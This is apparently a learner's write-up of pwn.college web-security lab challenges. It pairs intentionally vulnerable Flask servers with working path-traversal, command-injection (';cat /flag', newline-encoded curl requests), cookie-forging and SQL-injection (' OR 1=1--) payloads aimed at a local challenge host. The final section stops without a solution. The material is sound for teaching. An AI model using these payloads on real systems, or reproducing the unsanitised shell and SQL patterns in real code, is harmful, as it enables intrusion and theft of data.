#web  #SQLi #AuthnenticationBypass #CMDi  #pwncollege

**Path Traversal 1:**

Basic webserver in python:
```python
hacker@web-security~path-traversal-1:~/WebSecurity$ cat /challenge/server
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/files", methods=["GET"])
@app.route("/files/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```



Challenge host a server: /challenge/server. We want to make the server send us the /flag file. If we send a basic request to the server:
```
curl -v http://challenge.localhost/files
```
It responds with a 200 status code, and the index.html file. So we have to go 2 folder layers down to come to root folder, so we try:
```
curl -v http://challenge.localhost/files/../../flag
```
This do not work either. Might be because the server is set to block path traversal.

We try to url encode the path traversal:
```
curl -v http://challenge.localhost/files%2F..%2F..%2Fflag
```
And it gives us the flag. 




**Path Traversal 2:**
```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

- The path.strip('/.') prevents the path string to start/end with any / or . character.  
- But we can have /../.. in the middle of the string, so we simply go forward to a folder, then go backwards. Also, we url encode. 

Solution:
```python
import requests

r = requests.get("http://challenge.localhost:80/shared/fortunes%2F..%2F..%2F..%2Fflag")
print(r.text)
```


**CMDi 1:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("directory", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- The argument is not sanitized in any way, so we can set the command to: `;cat /flag`, so the command the system executes is: `ls -l; cat /flag`, which lets us read the flag. 


**CMDi 2:**
```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("root", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/milestone"><input type=text name=root><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- They now remove the ; sign from being used, but we can still use other ways of chaining commands. We send: `| cat /flag` , so the system execute: `ls -l | cat /flag`. This just means cat has access to the output of ls, but we can still use cat normally. 

**CMDi 3:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("location", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=location><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Here the argument is supposed to be treated as a string. We can escape the string by starting our argument with a signal quote. And we also have to close it for the command to be valid. So we inject: `';cat /flag`, so the executed command is: `ls -l '';cat/flag''`


**CMDi 4:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/event", methods=["GET"])
def challenge():
    arg = flask.request.args.get("tzid", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/event"><input type=text name=tzid><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Again the argument is not sanitized, but this time the injection is in the parameter argument for the `date` command. We can chain it into a new command, so the command executed is: `TZ=;cat /flag #date`. We do need to add the `#` sign, but it removes the execution of the `date` command all together. 

**CMDi 5:**
```python
@app.route("/assignment", methods=["GET"])
def challenge():
    arg = flask.request.args.get("absolute-path", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/assignment"><input type=text name=absolute-path><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- This time the argument is still not sanitized, but we can not see the output of our injected command. A solution is to write the output of the injection into a file, and then read the file from the terminal: `;cat /flag > /home/hacker/flag`  

**CMDi 6:**
```python
@app.route("/puzzle", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("filedir", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/puzzle"><input type=text name=filedir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Hint: how to end lines when running multiple lines in a bash script. 
- This is a tricky one, but the idea is that it does not sanitize for newline characters. New line can work and a way to execute a new command in bash. 
- It do not seem to work injecting in the direct website, but if we send it url encoded with curl or in the url of the browser, it works. 
- **Idea on why it does not work via the text box:** The input in the textbox gets translated into a new url, this can mess up things. Sending our payload directly to the url or via curl lets us bypass this translation. 

```
Get executed on the server: ls -la {/challenge \ncat /flag} = 
ls -la /challenge
cat /flag

Works:
curl -v http://challenge.localhost/puzzle?filedir=%2Fchallenge%0acat+%2Fflag

curl -v http://challenge.localhost/puzzle?filedir=%2Fchallenge%0Acat+%2Fflag

curl -v http://challenge.localhost/puzzle?filedir=%2Fchallenge%0Acat%20%2Fflag

curl -v http://challenge.localhost/puzzle?filedir=%0Acat%20%2Fflag
```


**Authentication bypass 1:**
```python
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:guest
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)


```
- We can see the login creds for the guest user. Loggin in as guest, we get a session id in the url:`http://challenge.localhost/?session_user=guest`.
- We can simply change the session_user to admin: `http://challenge.localhost/?session_user=admin`, and we get the flag. 

**Authenticaton bypass 2:**
```python
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This time we could not change the session_id from the url, but since we know the session_id of the admin, we can just spesify it in the post request. This python script solves the challenge:
```python
import requests

cookies = {'session_user': 'admin'}
data = {'username': 'guest', 'password': 'password'}


r_post = requests.post('http://challenge.localhost', data=data, cookies=cookies)
print(r_post.text)
```

**SQLi 1:**
```python
..

@app.route("/log", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("account-name")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `account-name` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/log", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=account-name>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

```

```

SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }

payload1 = admin
payload2 = 0 OR 1=1--
Executed: "SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1--"

1=1 is always true. So SQL think of this as the username of admin, and a pin which is true i.e. we authenticate as admin.
```

**SQLi 2:**
```python
..
@app.route("/user-login", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("user")
    password = flask.request.form.get("security-token")
    if not username:
        flask.abort(400, "Missing `user` form parameter")
    if not password:
        flask.abort(400, "Missing `security-token` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/user-login", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=user>Password:<input type=text name=security-token><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)



```


```
"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"

password=' OR 1=1--
Executed: "SELECT rowid, * FROM users WHERE username = '{username}' AND password = '' OR 1=1--"

Same logic as the previous one, only this time we had to close the '' before we could inject our true-query. 
```

**SQLi 3:**
```python
@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:

        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```
query: 'SELECT username FROM users WHERE username LIKE "{query}"'


```